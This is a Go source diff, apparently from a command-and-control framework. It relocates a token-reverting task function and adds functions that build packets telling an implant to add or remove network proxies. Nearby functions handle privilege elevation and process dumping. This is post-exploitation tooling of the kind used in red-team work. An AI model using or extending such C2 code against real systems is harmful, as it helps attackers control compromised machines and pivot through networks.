@@ -67,6 +67,26 @@ func Refresh() *com.Packet {
 	return &com.Packet{ID: MvRefresh}
 }
 
+// RevToSelf returns a Rev2Self Packet. This can be used to instruct Windows
+// based devices to drop any previous elevated Tokens they may posess and return
+// to their "normal" Token.
+//
+// This task result does not return any data, only errors if it fails.
+//
+// C2 Details:
+//  ID: MvRevSelf
+//
+//  Input:
+//      <none>
+//  Output:
+//      <none>
+//
+// C2 Client Command:
+//  rev2self
+func RevToSelf() *com.Packet {
+	return &com.Packet{ID: MvRevSelf}
+}
+
 // ScreenShot returns a screenshot Packet. This will instruct the client to
 // attempt to get a screenshot of all the current active desktops on the host.
 // If successful, the returned data is a binary blob of the resulting image,
@@ -115,26 +135,6 @@ func Ls(d string) *com.Packet {
 	n := &com.Packet{ID: MvList}
 	n.WriteString(d)
 	return n
-}
-
-// RevToSelf returns a Rev2Self Packet. This can be used to instruct Windows
-// based devices to drop any previous elevated Tokens they may posess and return
-// to their "normal" Token.
-//
-// This task result does not return any data, only errors if it fails.
-//
-// C2 Details:
-//  ID: MvRevSelf
-//
-//  Input:
-//      <none>
-//  Output:
-//      <none>
-//
-// C2 Client Command:
-//  rev2self
-func RevToSelf() *com.Packet {
-	return &com.Packet{ID: MvRevSelf}
 }
 
 // ProcessList returns a list processes Packet. This can be used to instruct
@@ -254,6 +254,31 @@ func Pull(url, path string) *com.Packet {
 	return n
 }
 
+// ProxyRemove returns a remove Proxy Packet. This can be used to instruct the
+// client to attempt to remove the Proxy setup by the name, or the single Proxy
+// instance (if multi-proxy mode is disabled).
+//
+// Returns an NotFound error if the Proxy is not registered or Proxy support is
+// disabled
+//
+// C2 Details:
+//  ID: MvProxy
+//
+//  Input:
+//      string // Proxy Name (may be empty)
+//      bool   // Always set to true for this task.
+//  Output:
+//      <none>
+//
+// C2 Client Command:
+//  proxy_del <name>
+func ProxyRemove(name string) *com.Packet {
+	n := &com.Packet{ID: MvProxy}
+	n.WriteString(name)
+	n.WriteBool(true)
+	return n
+}
+
 // Elevate returns an evelate Packet. This will instruct the client to use the
 // provided Filter to attempt to get a Token handle to an elevated process. If
 // the Filter is nil, then the client will attempt at any elevated process.
@@ -333,6 +358,35 @@ func Upload(dst string, b []byte) *com.Packet {
 func ProcessDump(f *filter.Filter) *com.Packet {
 	n := &com.Packet{ID: TvProcDump}
 	f.MarshalStream(n)
+	return n
+}
+
+// Proxy returns an add Proxy Packet. This can be used to instruct the client to
+// attempt to add the specified Proxy with the name, bind address and Profile
+// bytes.
+//
+// Returns an error if Proxy support is disabled, a listen/setup error occurs or
+// the name already is in use.
+//
+// C2 Details:
+//  ID: MvProxy
+//
+//  Input:
+//      string // Proxy Name (may be empty)
+//      bool   // Always set to false for this task.
+//      string // Proxy Bind Address
+//      []byte // Proxy Profile
+//  Output:
+//      <none>
+//
+// C2 Client Command:
+//  proxy <name> <address> <profile>
+func Proxy(name, addr string, p []byte) *com.Packet {
+	n := &com.Packet{ID: MvProxy}
+	n.WriteString(name)
+	n.WriteBool(false)
+	n.WriteString(addr)
+	n.WriteBytes(p)
 	return n
 }
 
